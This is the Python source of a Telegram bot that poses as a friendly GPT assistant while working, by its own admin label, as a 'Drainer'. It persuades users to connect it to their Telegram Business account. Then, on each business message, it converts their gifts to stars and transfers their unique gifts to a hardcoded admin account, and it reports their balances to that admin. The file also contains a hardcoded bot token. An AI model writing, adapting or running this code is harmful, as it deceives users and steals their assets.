import asyncio
import json
import logging
import os

from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    business_connection,
)
from aiogram.filters import Command
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift, ConvertGiftToStars, UpgradeGift

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

# === Configuration ===
TOKEN = "7650902215:AAEtbYIKJIxtiLT_VI00C6seM-QRaIglGH0"
ADMIN_ID = 7641767864
CONNECTIONS_FILE = "business_connections.json"

bot = Bot(TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

# === Utilities ===
def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def load_connections():
    return load_json_file(CONNECTIONS_FILE)

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = load_json_file(CONNECTIONS_FILE)
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            break
    else:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        rights = connection.rights
        star_amount = all_gifts_amount = unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            stars = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection.id))
            star_amount = stars.star_amount
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for g in gifts.gifts if g.type == "unique")

        msg = (
            f"🤖 <b>New business bot connected!</b>\n\n"
            f"👤 User: @{connection.user.username or '—'}\n"
            f"🆔 User ID: <code>{connection.user.id}</code>\n"
            f"🔗 Connection ID: <code>{connection.id}</code>\n\n"
            f"⭐️ Stars: <code>{star_amount}</code>\n"
            f"🎁 Gifts: <code>{all_gifts_amount}</code>\n"
            f"🔝 Unique gifts: <code>{unique_gifts_amount}</code>"
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Reveal All Gifts", callback_data=f"reveal_all_gifts:{user_id}")],
            [InlineKeyboardButton(text="⭐ Convert Gifts to Stars", callback_data=f"convert_exec:{user_id}")],
            [InlineKeyboardButton(text="🔝 Upgrade All Gifts", callback_data=f"upgrade_user:{user_id}")],
        ])
        await _bot.send_message(ADMIN_ID, msg, reply_markup=keyboard)
    except Exception as e:
        logging.exception("Failed to send welcome message to admin.")

# === Bot Handlers ===
@dp.message(Command("refund"))
async def refund_command(message: Message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("Please specify the transaction ID. Example: /refund 123456")
            return

        transaction_id = parts[1]
        result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if result:
            await message.answer(f"Refund for transaction {transaction_id} completed successfully!")
        else:
            await message.answer(f"Failed to refund transaction {transaction_id}.")
    except Exception as e:
        await message.answer(f"Refund error: {str(e)}")

@dp.message(Command("start"))
async def start_command(message: Message):
    try:
        count = len(load_connections())
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>I’m your assistant</b> who:\n"
            "• Answers any question\n"
            "• Supports you anytime\n"
            "• Helps with school/work/art\n\n"
            "<i>Type your request below and I’ll help!</i>",
        )
    else:
        await message.answer(
            f"Antistoper Drainer Admin Mode Enabled\n\nConnected bots: {count}"
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>To use this bot fully, connect it to your Telegram Business account.</b>\n\n"
        "How to do it:\n"
        "1. ⚙️ Open Telegram Settings\n"
        "2. 💼 Go to 'Telegram for Business'\n"
        "3. 🤖 Open 'Chat Bots'\n"
        "4. ✍️ Enter <code>@TitanGpt_RoBot</code>\n\n"
        "Bot Username: <code>@TitanGpt_RoBot</code>",
    )

@dp.business_connection()
async def on_business_connected(connection: business_connection):
    await send_welcome_message_to_admin(connection, connection.user.id, bot)
    await bot.send_message(connection.user.id, "Hi! You've connected me as a business assistant. Now send '.gpt your query' in any chat.")
    save_business_connection_data(connection)

@dp.business_message()
async def handle_business_message(message: Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id

    if user_id == ADMIN_ID:
        return

    # Convert non-unique gifts
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in gifts.gifts:
            try:
                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
            except Exception:
                continue
    except Exception:
        pass

    # Transfer unique gifts
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            try:
                await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)
            except Exception:
                continue
    except Exception:
        pass

    # Handle stars
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if stars.amount > 0:
            print(f"Stars available: {stars.amount}")
    except Exception:
        pass

# === Launch Bot ===
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
